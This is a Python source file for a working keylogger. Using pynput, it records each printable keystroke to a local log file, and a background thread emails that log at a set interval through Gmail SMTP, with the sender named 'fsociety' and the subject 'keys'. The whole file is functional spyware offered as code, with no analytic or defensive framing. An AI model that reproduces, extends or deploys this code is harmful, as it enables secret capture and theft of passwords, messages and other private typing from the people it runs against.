import os
import sys
import time
import argparse
import getpass
import threading
import smtplib
from string import Template
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

from pynput import keyboard

LOG_NAME = 'keys.log'
BASE_DIR = os.path.dirname(os.path.realpath(__file__))
LOG_PATH = os.path.join(BASE_DIR, LOG_NAME)

EMAIL = ''
PASSWORD = ''
EMAIL_DELEY = 60


def main():
	global EMAIL
	global PASSWORD
	global EMAIL_DELEY
	global LOG_PATH

	parser = argparse.ArgumentParser()
	parser.add_argument('-l', '--log', type=str, help='Log file path')
	parser.add_argument('-s', '--send', nargs='?', default=False, help='Send me logs on my mail')
	parser.add_argument('-d', '--delay', type=int, help='Deley to send mail')
	args = parser.parse_args()

	if args.log:
		LOG_PATH = args.log

	if args.delay:
		EMAIL_DELEY = args.delay

	if args.send is None:
		EMAIL = input('email: ')
		PASSWORD = getpass.getpass('password: ')

		try:
			smt = auth_mail(EMAIL, PASSWORD)
			smt.quit()
		except smtplib.SMTPAuthenticationError:
			print('Authentication failed')
			sys.exit()

	if not os.path.exists(LOG_PATH):
		with open(LOG_PATH, 'w') as f:
			pass

	with open(LOG_PATH, 'a') as log_file:
		if not os.stat(LOG_PATH).st_size == 0:
			log_file.write('\n\n')

		log_file.write('=' * 30)
		log_file.write('\n{}\n'.format(time.strftime('%Y-%b-%d, %H:%M:%S')))
		log_file.write(('=' * 30) + '\n')

	stop_event = threading.Event()
	mail_thread = MailThread(EMAIL, PASSWORD, stop_event)

	if EMAIL and PASSWORD:
		mail_thread.start()

	with keyboard.Listener(on_press=on_press) as listener:
		try:
			listener.join()
		except KeyboardInterrupt:
			stop_event.set()
			sys.exit()


def on_press(key):
	try:
		if key == keyboard.Key.enter:
			write_log('\n')
		write_log(str(key.char))
	except AttributeError:
		# Don't care about special keys
		pass


def auth_mail(email, password):
	smt = smtplib.SMTP('smtp.gmail.com', 587)
	smt.ehlo()
	smt.starttls()
	smt.login(email, password)
	return smt


def send_mail(sender, subject, message):
	smt = auth_mail(EMAIL, PASSWORD)
	mail = MIMEMultipart()

	msg = Template(message).substitute(PERSON_NAME='NAME')

	mail['From'] = sender
	mail['To'] = EMAIL
	mail['Subject'] = subject

	mail.attach(MIMEText(msg, 'plain'))

	smt.send_message(mail)
	del mail
	smt.quit()


def write_log(content):
	with open(LOG_PATH, 'a') as f:
		f.write(content)


def read_log():
	with open(LOG_PATH) as f:
		return f.read()


class MailThread(threading.Thread):
	def __init__(self, email, password, event):
		super().__init__()
		self.email = email
		self.password = password
		self.event = event
	
	def run(self):
		while not self.event.wait(EMAIL_DELEY):
			send_mail(sender='fsociety',
					subject='keys',
					message=read_log())


if __name__ == '__main__':
	main()
